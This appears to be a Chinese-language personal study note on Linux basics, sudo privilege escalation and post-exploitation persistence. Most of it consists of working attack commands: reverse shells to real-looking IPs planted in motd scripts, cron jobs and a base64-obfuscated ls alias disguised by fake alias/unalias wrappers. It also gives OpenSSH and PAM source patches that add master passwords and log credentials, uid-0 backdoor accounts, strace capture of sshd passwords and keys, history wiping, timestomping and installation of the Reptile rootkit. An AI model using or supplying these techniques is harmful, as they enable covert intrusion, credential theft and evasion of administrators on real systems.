## 基础积累

### /etc/passwd：

linux读取密码时优先读取 /etc/passwd 如果里面没有密码才会读取 /etc/shadow

如果给与普通用户可修改etc/passwd的权限，那么他就能修改root的密码，所以一般普通用户对/etc/passwd是没有修改权限的



### 命令less、more：

<img src=".\图片\Snipaste_2022-11-27_22-10-48.png" alt="Snipaste_2022-11-27_22-10-48"  />

假如命令less、more能以sudo方式（root权限）运行

以sudo命令执行less，在文件末尾加上

```
!/bin/bash
```

在less命令查看文件下，其实命令没结束，当前卡在交互模式下，此时调bash即提权

<img src=".\图片\Snipaste_2022-11-27_22-11-24.png" alt="Snipaste_2022-11-27_22-11-24" style="zoom:80%;" />

### vi提权

当  vi 可以以root方式运行 sudo vi，便可产生提权

1、修改root密码，这个方式很暴力，容易被发现，不建议使用

```
└─# sudo vi /etc/passwd
```

2、查看 /etc/shadow ，然后试试暴力破解，这个方式不一定爆破得出来

```
└─# sudo vi /etc/shadow
```

3、相当于差不多任意文件读取、修改

4、最建议的方式，sudo vi ，直接按ESC  :!/bin/bash

```
┌──(kali㉿kali)-[/root]
└─$ sudo vi

:!/bin/bash

┌──(root💀kali)-[~]
└─# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),120(wireshark),142(kaboxer)
```

仍然要记得清除本地的bash的history

### > 与 >>

```
echo "ssss" > test
```

\>：信息导出并覆盖
\>>：信息导出但添加

### 命令后台执行  &

```
└─# ping baidu.com > a.txt &
```

### 管道 | 与 grep

前一个命令的输出作为下个命令的输入

```
└─# cat /etc/passwd | grep root
root:x:0:0:root:/root:/usr/bin/zsh
nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin

└─# cat /etc/passwd | grep root | grep 125                                                                   
nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
```

### ps命令和kill命令

ps 查看进程 -ef 显示所有后台运行的进程 aux 为看进程的cpu内存使用率，ppid为父进程

```
└─# ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  1 02:06 ?        00:00:01 /sbin/init splash
root           2       0  0 02:06 ?        00:00:00 [kthreadd]
root           3       2  0 02:06 ?        00:00:00 [rcu_gp]
.....................

└─# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.5 164032 10344 ?        Ss   02:06   0:01 /sbin/init splash
root           2  0.0  0.0      0     0 ?        S    02:06   0:00 [kthreadd]
......................
```

运用管道符 | 可使用在ps结果里寻找对应信息

```
└─# ps -ef | grep server
root         903     788  0 02:06 ?        00:00:00 /usr/lib/openssh/sftp-server
root         921     788  0 02:06 ?        00:00:00 /usr/lib/openssh/sftp-server
................
```

kill 命令为终止进程，加参数 -9 为无条件直接杀死 XX 进程（适合进程无响应时用），加参数 -15 为按顺序合理退出 XX 进程，不加参数默认为 -15

```
└─# python3 -m http.server &
[1] 1213
└─# ps -ef | grep python                                                                                     
root         599       1  0 02:06 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1213     765  0 02:24 pts/0    00:00:00 python3 -m http.server
root        1220     765  0 02:25 pts/0    00:00:00 grep --color=auto python
└─# kill -9 1213                                                                                              [1]  + killed     python3 -m http.server
```

### Linux启动时的提示信息

每次登录时 kali 就显示了这些

```
连接成功
Linux kali 5.10.0-kali9-amd64 #1 SMP Debian 5.10.46-4kali1 (2021-08-09) x86_64
```

我们能看到这里是  10-uname 里面的命令 uname -snrvm执行的结果，10-uname的权限为 

-rwxr-xr-x   1 root root    23 Aug 31  2021 10-uname

```
┌──(root💀kali)-[~]
└─# cd /etc/update-motd.d 
                                                                                                              ┌──(root💀kali)-[/etc/update-motd.d]
└─# ls -al
total 24
drwxr-xr-x   2 root root  4096 Jun 14 09:19 .
drwxr-xr-x 161 root root 12288 Dec  8 02:06 ..
-rwxr-xr-x   1 root root    23 Aug 31  2021 10-uname
-rwxr-xr-x   1 root root   165 Feb 19  2021 92-unattended-upgrades
                                                                                                              ┌──(root💀kali)-[/etc/update-motd.d]
└─# cat 10-uname         
#!/bin/sh
uname -snrvm
                                                                                                             ┌──(root💀kali)-[/etc/update-motd.d]
└─# uname -snrvm
Linux kali 5.10.0-kali9-amd64 #1 SMP Debian 5.10.46-4kali1 (2021-08-09) x86_64
```

假如我们把 10-uname 里面加入反弹shell的命令，这时候每当用户登录时便执行了反弹shell

```
┌──(root💀kali)-[/etc/update-motd.d]
└─# cat 10-uname
#!/bin/sh
uname -snrvm

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 43.142.255.132 1234 >/tmp/f &
```

```
ubuntu@VM-4-8-ubuntu:~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 119.190.166.41 42184
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

### netstat

netstat 是查看端口对应进程的情况

```
└─# netstat -antup                                                                                         
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:43795         0.0.0.0:*               LISTEN      605/containerd      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      619/sshd: /usr/sbin 
tcp        0      0 192.168.0.103:22        192.168.0.101:11574     ESTABLISHED 1245/sshd: root@pts 
tcp        0      0 192.168.0.103:22        192.168.0.101:11575     ESTABLISHED 1271/sshd: root@not 
tcp6       0      0 :::22                   :::*                    LISTEN      619/sshd: /usr/sbin 
udp        0      0 192.168.0.103:68        192.168.0.1:67          ESTABLISHED 542/NetworkManager  
```

### tali

tail 命令适合查看实时更新的日志信息，加参数 -f  、-nf（n为数字）

```
└─# ping baidu.com > 1.txt &
[1] 1662

└─# tail -f 1.txt                                                                                            64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=5 ttl=49 time=25.9 ms
64 bytes from 39.156.66.10 (39.156.66.10): icmp_seq=6 ttl=49 time=26.1 ms
...................................
```

### knock

本来目标机22端口是filter状态无法使用，但通过knock命令 knock -v 192.168.0.108 XXX XXX XXX后，22端口便是开放状态了

原理不详，暂时不实验

### linux密钥登录

如果没有.ssh目录，使用 `ssh localhost `生成

```
ssh localhost 
```

在.ssh目录生成公钥私钥

```
└─# ssh-keygen -t rsa -b 4096
```

```
└─# ll    
total 12
-rw------- 1 root root 3369 Dec 19 03:48 id_rsa
-rw-r--r-- 1 root root  735 Dec 19 03:48 id_rsa.pub
-rw-r--r-- 1 root root  222 Dec 19 03:46 known_hosts
```

```
mv rails.pub authorized_keys
```

把 authorized_keys 公钥传到目标服务器上，再用本地私钥ssh登录

```
ssh -i id_rsa root@192.168.229.129
```

思考：拿下一台服务器后，可以查看用户目录下的 .ssh 目录，私钥可能是这台主机远程连接其它主机的私钥，公钥可能是其它主机连接过这台主机的公钥

### bash

https://www.w3cschool.cn/bashshell/bashshell-4wc337ip.html

#### #/bin/bash

在 test 文件的前面加上 `#!/bin/bash` ，调用的就是`bash`的解析器

```
┌──(root💀kali)-[~]
└─# cat test     
#!/bin/bash
echo "Hello World";
                                                                                                
┌──(root💀kali)-[~]
└─# ./test
Hello World
```

在 test 文件的前面加上 `#!/bin/python3` ，调用的就是`python3`的解析器，如果用 `bash test` 强行调用，则以 `bash` 为准

```
┌──(root💀kali)-[~]
└─# cat test
#!/bin/python3
print('Hello World');                                                                                                                                                           
┌──(root💀kali)-[~]
└─# ./test  
Hello World

┌──(root💀kali)-[~]
└─# bash test                          
test: line 2: syntax error near unexpected token `'Hello World''
test: line 2: `print('Hello World');'
```

我们发现 `test` 文件是没有后缀名的，既不是 `.sh` 也不是 `.py`，在 `linux` 中后缀名是给人看的而不是给机器看的

#### bash下变量定义

双引号 `""` 里可以解析 `$` 定义的变量或者 `$()` 里执行的命令，单引号 `''` 则不行。反引号 ``  里也可以执行命令

```
┌──(root💀kali)-[~]
└─# a=Hello                                                                                                                                                                                                             ┌──(root💀kali)-[~]
└─# b=World                                                                                                                                                              
┌──(root💀kali)-[~]
└─# echo $a $b                                                                                             
Hello World                                                                                                                                                             
┌──(root💀kali)-[~]
└─# echo "$a $b"
Hello World                                                                                                                                                              
┌──(root💀kali)-[~]
└─# echo '$a $b'
$a $b                                                                                                                                                             
┌──(root💀kali)-[~]
└─# c=whoami                                                                                                                                                             
┌──(root💀kali)-[~]
└─# c="`whoami`"                                                                                                                                                             
┌──(root💀kali)-[~]
└─# echo $c     
root                                                                                                                                                             
┌──(root💀kali)-[~]
└─# c='`whoami`'                                                                                                                                                             
┌──(root💀kali)-[~]
└─# echo $c     
`whoami`                                                                                                                                                              
┌──(root💀kali)-[~]
└─# d="$a $(echo $b)"                                                                                                                                                          
┌──(root💀kali)-[~]
└─# echo $d
Hello World
```

#### 数字型变量

 `$(($a + $b))` 的形式做运算

```
┌──(root💀kali)-[~]
└─# a=1                                                                                                                                                                
┌──(root💀kali)-[~]
└─# b=2                                                                                                                                                                 
┌──(root💀kali)-[~]
└─# echo $(($a + $b))
3
```

可用 `let` 命令

```
┌──(root💀kali)-[~]
└─# let c=$a+$b                                                                                                                                                              
┌──(root💀kali)-[~]
└─# echo $c          
3

┌──(root💀kali)-[~]
└─# let c++                                                                                                                                                               
┌──(root💀kali)-[~]
└─# echo $c
4
```

#### bash脚本入参

```
┌──(root💀kali)-[~]
└─# cat args.sh     
#!/bin/bash
echo "the script's name is $0"
echo "there are $# argments"
echo "the first argment is $1"
echo "the second argment is $2"
echo "the 10th argment is \$10"
echo "the 10th argment is ${10}"
echo "all the argments are $@"
```

```
┌──(root💀kali)-[~]
└─# ./args.sh a b c d e f g h i j k l m
the script's name is ./args.sh
there are 13 argments
the first argment is a
the second argment is b
the 10th argment is $10
the 10th argment is j
all the argments are a b c d e f g h i j k l m
```

<img src=".\图片\Snipaste_2023-02-11_16-04-53.png" alt="Snipaste_2023-02-11_16-04-53" style="zoom:80%;" />

#### 用户交互一般操作

情况一

```
┌──(root💀kali)-[~]
└─# cat input_v1.sh      
#!/bin/bash
echo "please input your username:"
read username
echo "your username is $username"
echo "please input your password:"
read password
echo "your password is $password"
```

```
┌──(root💀kali)-[~]
└─# ./input_v1.sh                      
please input your username:
zf1yolo
your username is zf1yolo
please input your password:
123456
your password is 123456
```

情况二

```
┌──(root💀kali)-[~]
└─# cat input_v2.sh      
#!/bin/bash
read -p "please input your username: " username
echo "your username is: $username"
read -sp "please input your password: " password
echo ""
echo "your password is: $password"
```

输入密码时被隐藏了，更贴近实际

```
┌──(root💀kali)-[~]
└─# ./input_v2.sh
please input your username: zf1yolo
your username is: zf1yolo
please input your password: 
your password is: 123456
```



## linux权限维持

### 修改文件/终端属性

#### 1.1 文件创建时间

如果蓝队根据文件修改时间来判断文件是否为后门，如参考 index.php 的时间再来看 shell.php 的时间就 可以判断 shell.php 的生成时间有问题

解决方法

```
touch -r index.php shell.php
```

touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立 一个新的文件

修改前  使用`ls -al`查看

```
-rw-r--r--  1 root root       0 Dec 25 08:38 index.php
-rw-r--r--  1 root root       0 Dec 25 08:39 shell.php
```

修改后，可以看到 shell.php 的修改时间和 index.php 看齐了

```
-rw-r--r--  1 root root       0 Dec 25 08:38 index.php
-rw-r--r--  1 root root       0 Dec 25 08:38 shell.php
```

#### 1.2文件锁定

在Linux中，使用 **chattr** 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用`ls -l`是 查看不出来的，从而达到隐藏权限的目的

```
mkdir test              #创建目录
touch .evil.php          #创建文件
chattr +i .evil.php      #锁定文件
rm -rf .evil.php         #提示禁止删除
lsattr .evil.php         #属性查看
chattr -i .evil.php      #解除锁定
rm -rf .evil.php         #彻底删除文件
```

<img src=".\图片\Snipaste_2022-12-25_21-50-35.png" alt="Snipaste_2022-12-25_21-50-35" style="zoom:80%;" />

#### 1.3 历史操作命令

`history`命令查看当前使用命令的**历史记录**，**[space] + 命令** 不会被记录

在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？

-  **技巧一**：只针对你的工作关闭历史记录

```
[space]set +o history  # 备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录
```

上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而 这个命令之前的所有东西都会原样记录在历史列表中。 要重新开启历史功能，执行下面的命令

```
[Space]set -o history  # 将环境恢复原状
```

- **技巧二**：从历史记录中删除指定的命令

假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命 令来删除

```
history | grep "keyword"
```

输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项

```
history -d [num]
```

删除大规模历史操作记录，这里，我们只保留前150行

```
sed -i '150,$d' ~/.bash_history
```

#### 1.4 passwd增加用户

```
/etc/passwd 各部分含义：
用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL
```

```
/etc/shadow 各部分含义：
用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周
期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用
写入举例
```

1.增加超级用户

```
$perl -le 'print crypt("passwd","salt")'
sadtCr0CILzv2
```

```
$echo "m123:sadtCr0CILzv2:0:0:/root:/bin/bash" >> /etc/passwd
```

### OpenSSH后门

原理：**替换**本身操作系统的ssh协议支撑软件**openssh版本**，重新安装自定义的openssh,达到记录帐号密码，也可以采用**万能密码**连接的功能！
https://www.cnblogs.com/csnd/p/11807653.html
https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw

#### 1、环境准备

```
[root@zfy ~]# ssh -V  #查看当前服务器ssh版本
OpenSSH_7.4p1, OpenSSL 1.0.2k-fips  26 Jan 2017
```

```
yum -y install openssl openssl-devel pam-devel zlib zlib-devel #安装相关的依赖    
sudo apt-get install yum #这一步是安装 yum，已经安装了就不用加上了
yum -y install gcc gcc-c++ make  #安装C++编译环境                             

wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz #下载正常的包，可以下载也可以取得权限后上传
wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz #下载补丁包

tar -xzvf openssh-5.9p1.tar.gz #解压正常包
tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz #解压补丁包
cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1 #将openssh-5.9p1.patch/sshbd5.9p1.diff复制到openssh-5.9p1中
cd openssh-5.9p1 && patch < sshbd5.9p1.diff #移动到openssh-5.9p1
yum -y install patch # 当patch命令没有时就安装
```

#### 2、编辑万能密码

```
vim includes.h
```

```
177 #define ILOG "/tmp/ilog"	# ILOG是别人用ssh登录该主机记录的日志目录
178 #define OLOG "/tmp/olog"	# OLOG是该主机用ssh登录其他主机记录的日志目录 
179 #define SECRETPW "zf1yolo"	# 万能密码修改成自己想要的密码
180 #endif /* INCLUDES_H */
```

<img src=".\图片\Snipaste_2022-12-25_19-24-58.png" alt="Snipaste_2022-12-25_19-24-58" style="zoom:80%;" />

同步原来的`OpenSSL`版本，避免被发现

```
vim version.h
```

<img src=".\图片\Snipaste_2022-12-25_20-24-07.png" alt="Snipaste_2022-12-25_20-24-07" style="zoom:80%;" />

#### 3、安装编译

```
./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 && make && make install
```

若出现重启ssh服务报错，如下

```
chmod 600 /etc/ssh/ssh_host_rsa_key
chmod 600 /etc/ssh/ssh_host_ecdsa_key
service sshd start
chown -R root.root /var/empty/sshd
chmod 744 /var/empty/sshd
service sshd restart
```

```
service sshd restart #重启sshd服务
systemctl status sshd.service #查看ssh启动状态
```

#### 4、万能密码连接

<img src=".\图片\Snipaste_2022-12-25_20-14-17.png" alt="Snipaste_2022-12-25_20-14-17" style="zoom:60%;" />

同时当管理员使用使用原密码登录时，也可以成功登录而且登录的密码会记录在`/tmp/ilog`下

### PAM后门

参考：https://xz.aliyun.com/t/7902

PAM是一种认证模块，PAM可以作为Linux登录验证和各类基础服务的认证，简单来说就是一种用于Linux系统上的**用户身份验证的机制**。进行认证时首先确定是什么服务，然后加载相应的PAM的配置文件(位于/etc/pam.d)，最后调用认证文件(位于/lib/security)进行安全认证.简易利用的PAM后门也是通过修改PAM源码中认证的逻辑来达到权限维持

1、获取目标系统所使用的PAM版本，下载对应版本的pam版本

2、解压缩，修改pam_unix_auth.c文件，添加万能密码

3、编译安装PAM

4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即使用万能密码登陆，将用户名密码记录到文件中

#### 环境配置

关闭防火墙

```
[root@zfy ~]# setenforce 0
```

查询版本pam版本

```
[root@zfy ~]# rpm -qa | grep pam
pam-1.1.8-22.el7.x86_64
```

下载对应版本https://github.com/linux-pam/linux-pam/tags,拖到主机上，如果不能上传文件可以传到web服务上然后利用wget下载

解压

```
[root@zfy ~]# yum install unzip    # 安装unzip，若果存在就不用安装
[root@zfy ~]# unzip Linux-PAM-1.1.8-master.zip
```

安装依赖

```
yum install gcc flex flex-devel -y
```

#### 修改配置

留PAM后门和保存SSH登录的账号密码
修改`Linux-PAM-1.1.8-master/modules/pam_unix/pam_unix_auth.c`

<img src=".\图片\Snipaste_2022-12-25_20-45-41.png" alt="Snipaste_2022-12-25_20-45-41"  />

将该段代码修改为以下的代码，`hackers`就是后门密码

```
/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
if(strcmp("hackers",p)==0){return PAM_SUCCESS;} //后门密码
if(retval == PAM_SUCCESS){ 
FILE * fp; 
fp = fopen("/tmp/.sshlog", "a");//SSH登录用户密码保存位置
fprintf(fp, "%s : %s\n", name, p); 
fclose(fp);} 
name = p = NULL;
AUTH_RETURN;
```

#### 编译安装

```
cd Linux-PAM-1.1.8-master
./configure && make
```

#### 备份复制

备份原有pam_unix.so,防止出现错误登录不上，复制新PAM模块到/lib64/security/目录下

```
cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp
cd Linux-PAM-1.1.8-master/modules/pam_unix/.libs
cp pam_unix.so /usr/lib64/security/pam_unix.so
```

#### 登录

用刚才配置的密码**hackers**即可登录

<img src=".\图片\Snipaste_2022-12-25_21-04-06.png" alt="Snipaste_2022-12-25_21-04-06" style="zoom: 80%;" />

### 登录方式-软链接&公私钥&新帐号

#### 1、SSH软链接

在sshd服务配置启用PAM认证的前提下，PAM配置文件中控制标志为sufficient时，只要pam_rootok模块检测uid为0（root）即可成功认证登录。
SSH配置中开启了PAM进行身份验证

查看是否使用PAM进行身份验证：

```
cat /etc/ssh/sshd_config|grep UsePAM
```

<img src=".\图片\Snipaste_2022-12-25_21-06-48.png" alt="Snipaste_2022-12-25_21-06-48" style="zoom:80%;" />

```
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
ssh root@xx.xx.xx.xx -p 8888  #输入任意密码都可以连接
```

<img src=".\图片\Snipaste_2022-12-25_21-08-29.png" alt="Snipaste_2022-12-25_21-08-29" style="zoom:80%;" />

该方法重启后失效，而且开了个新端口，很容易被发现

#### 2、公私钥

使用kali命令生成密钥，存放在`/root/.ssh/` 目录下

```
ssh-keygen       # 按三次回车
```

修改靶机的 `/etc/ssh/ssh_config`文件中的三个选项，使其开启公私钥登录

```
vim /etc/ssh/sshd_config
```

```
RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
```

再将kali中的 `/root/.ssh/id_rsa.pub` 中的内容写入到靶机的 `/root/.ssh/authorized_keys`文件中，如果没有可以自行创建

再用命令登录，也可以直接 ssh root@IP即可连接

```
ssh -i id_rsa root@192.168.0.104
```

<img src=".\图片\Snipaste_2022-12-25_21-25-29.png" alt="Snipaste_2022-12-25_21-25-29" style="zoom:80%;" />

#### 3、后门账号

添加root用户：
添加账号test1，设置uid为0，密码为123456

```
useradd -p `openssl passwd -1 -salt 'salt' 123456` test1 -o -u 0 -g root -G root -s /bin/bash -d /home/test1
```

<img src=".\图片\Snipaste_2022-12-25_21-29-12.png" alt="Snipaste_2022-12-25_21-29-12" style="zoom:80%;" />

另一种方法

```
echo "test2:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号
passwd test2 #修改test2的密码为zf1yolo
```

<img src=".\图片\Snipaste_2022-12-25_21-30-47.png" alt="Snipaste_2022-12-25_21-30-47" style="zoom:80%;" />

两种方法后看看 /ect/passwd 

<img src=".\图片\Snipaste_2022-12-25_21-32-30.png" alt="Snipaste_2022-12-25_21-32-30" style="zoom:80%;" />

### Cron定时任务

利用系统的定时任务功能进行反弹Shell，**痕迹很明显**，查看定时任务就回发现端倪

#### 1、编辑后门反弹

```
vi /etc/.test.sh
```

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.103/3333 0>&1
```

```
chmod +x /etc/.test.sh  # 加上执行权限
```

#### 2、添加定时任务

```
vi /etc/crontab
*/1 * * * * root /etc/.test.sh    # 以root权限每分钟执行该文件
```

#### 3、本地nc监听

```
nc -lvvp 3333 
```

<img src=".\图片\Snipaste_2022-12-26_15-22-21.png" alt="Snipaste_2022-12-26_15-22-21" style="zoom:80%;" />

### 监控功能-Strace后门

strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个**键盘记录的后门**，来扩大我们的信息收集范围

这种是把键盘记录的密码明文保存到一个文件

#### 1、记录sshd明文

```
# 开启记录
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &)

# 管理员ssh连接后查看.sshd.log中的记录
grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log
```

注意，没有strace命令时安装 `apt-get install strace`

<img src=".\图片\Snipaste_2022-12-26_15-45-27.png" alt="Snipaste_2022-12-26_15-45-27" style="zoom:80%;" />

#### 2、记录sshd私钥

```
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 4096 2> /tmp/.sshd.log &)

grep 'PRIVATE KEY' /tmp/.sshd.log
```

### 命令自定义-Alias后门

#### 原理

alias命令的功能：为命令设置别名

```
#定义：
alias ls='ls -al'        # 输入 ls 命令就显示了 ls -al 的结果

#删除别名
unalias ls
```

<img src=".\图片\Snipaste_2022-12-26_15-47-18.png" alt="Snipaste_2022-12-26_15-47-18" style="zoom:80%;" />

#### 1、简单利用

```
# 将ls设置为反弹shell
alias ls='alerts(){ ls $* --color=auto;bash -i >& /dev/tcp/192.168.0.103/3333 0>&1; };alerts'
```

当输入 ls 时就会反弹 shell 到指定 ip

<img src=".\图片\Snipaste_2022-12-26_15-49-56.png" alt="Snipaste_2022-12-26_15-49-56" style="zoom:80%;" />

缺点：输入ls后会卡住

<img src=".\图片\Snipaste_2022-12-26_15-50-51.png" alt="Snipaste_2022-12-26_15-50-51"  />

#### 2、升级利用

执行如下命令

```
alias ls='alerts(){ ls $* --color=auto;python3 -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'\''UTF-8'\'')}[sys.version_info[0]]('\''aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiNDMuMTQyLjI1NS4xMzIiLCA2NjY2KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ=='\'')))";};alerts'
```

命令中的 base64 解密如下，是 socket 反弹 shell

```
import os,socket,subprocess;
ret = os.fork()
if ret > 0:
    exit()
else:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("43.142.255.132", 6666))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        exit()
```

再输入命令

```
alias unalias='alerts(){ if [ $# != 0 ]; then if [ $* != "ls" ]&&[ $* != "alias" ]&&[ $* != "unalias" ]; then unalias $*;else echo "-bash: unalias: ${*}: not found";fi;else echo "unalias: usage: unalias [-a] name [name ...]";fi;};alerts'

alias alias='alerts(){ alias "$@" | grep -v unalias | sed "s/alerts.*lambda.*/ls --color=auto'\''/";};alerts'
```

再执行 ls 后会反弹 shell 到指定 ip，且不会卡住，无痕迹，**但是该方法重启之后会失效**

接受到了，但为什么我的服务器Ubuntu的nc反弹不回来，迷惑

<img src=".\图片\Snipaste_2022-12-26_16-29-07.png" alt="Snipaste_2022-12-26_16-29-07"  />

#### 3、持久化+隐藏

重启后依旧有效

```
vim /etc/upload
#将上面的三个后门命令写入
```

```
alias ls='alerts(){ ls $* --color=auto;python3 -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'\''UTF-8'\'')}[sys.version_info[0]]('\''aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4zMS4xMzYiLCA2NjY2KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ=='\'')))";};alerts'

alias unalias='alerts(){ if [ $# != 0 ]; then if [ $* != "ls" ]&&[ $* != "alias" ]&&[ $* != "unalias" ]; then unalias $*;else echo "-bash: unalias: ${*}: not found";fi;else echo "unalias: usage: unalias [-a] name [name ...]";fi;};alerts'

alias alias='alerts(){ alias "$@" | grep -v unalias | sed "s/alerts.*lambda.*/ls --color=auto'\''/";};alerts'
```

```
vim ~/.bashrc
#在最后面写入
if [ -f /etc/upload ]; then
	. /etc/upload
fi
```

重启后输入ls依旧可以反弹shell

### 内核加载LKM-Rootkit后门

现在常用的linux维持权限的方法大多用crontab和开机自启动，同时使用的大多是msf 或者其它的tcp连接来反弹shell ,这种做法比较容易被管理员发现。所以我们想有一个非tcp连接、流量不容易被怀疑的后门，并且在大量的shell的场景下，可以管shell，Reptile刚好是种LKM rootkit，因此具有很好的隐藏性和强大的功能

https://github.com/f0rb1dd3n/Reptile/releases/

#### 安装

```
vim shell.sh
```

Centos

```
$kernel=`uname -r`
# centos
yum -y install perl vim gcc make g++ unzip
# 由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地
yum -y localinstall kernel-devel-"$kernal".rpm
cd Reptile-2.0/ && chmod +x ./setup.sh  # Reptile-2.0/ 为文件目录
./setup.sh install <<EOF
reptile
zf1yolo                                   # 密码，可修改
zf1yolo                                 # 口令，可修改
reptile
666
y
192.168.0.104                          # 为接收ip及端口
4455                                    # 及端口
1
EOF
```

Ubuntu ，同理 Centos 配置

```
apt-get install vim gcc make g++ unzip -y
apt-get -y install linux-headers-$(uname -r)
cd Reptile-2.0/ && chmod +x ./setup.sh  # Reptile-2.0/ 为文件目录
./setup.sh install <<EOF
reptile
zf1yolo                                   # 密码，可修改
zf1yolo                                  # 口令，可修改
reptile
666
y
43.142.255.132                          # 为接收ip及端口
4455                                     # 及端口
1            
EOF
```

```
chmod 777 shell.sh
./shell.sh
```

<img src=".\图片\Snipaste_2022-12-27_15-00-27.png" alt="Snipaste_2022-12-27_15-00-27" style="zoom:80%;" />

#### 使用

https://github.com/f0rb1dd3n/Reptile/wiki

##### 隐藏进程

```
/reptile/reptile_cmd hide        #隐藏进程

/reptile/reptile_cmd show        #显示进程
```

测试，创建一个一直 ping 的进程

```
nohup ping 114.114.114.114 & ps -ef | grep ping | grep -v grep  
```

<img src=".\图片\Snipaste_2022-12-27_15-04-09.png" alt="Snipaste_2022-12-27_15-04-09" style="zoom:80%;" />

尝试把进程隐藏

```
/reptile/reptile_cmd hide 257295
ps -ef | grep ping | grep -v grep
```

<img src=".\图片\Snipaste_2022-12-27_15-06-59.png" alt="Snipaste_2022-12-27_15-06-59" style="zoom:80%;" />

##### 隐藏连接

```
#隐藏连接: 
/reptile/reptile_cmd [udp/tcp等] [目标地址] hide
#显示连接:
/reptile/reptile_cmd [udp/tcp等] [目标地址] show
```

传统使用 msf 上线会存在一个连接，管理员查看网络情况很容易发现后门，那么可以使用 reptile 隐藏，这个操作是类似进程注入，把 msf 上线的端口**隐藏到别的端口**里，就不容易被发现

```
netstat -anpt | grep XX.XX.XX.XX   
/reptile/reptile_cmd tcp XX.XX.XX.XX 7878 hide
```

##### 隐藏文件

文件名中带`reptile`的都会被隐藏

```
mkdir reptile_love
ls
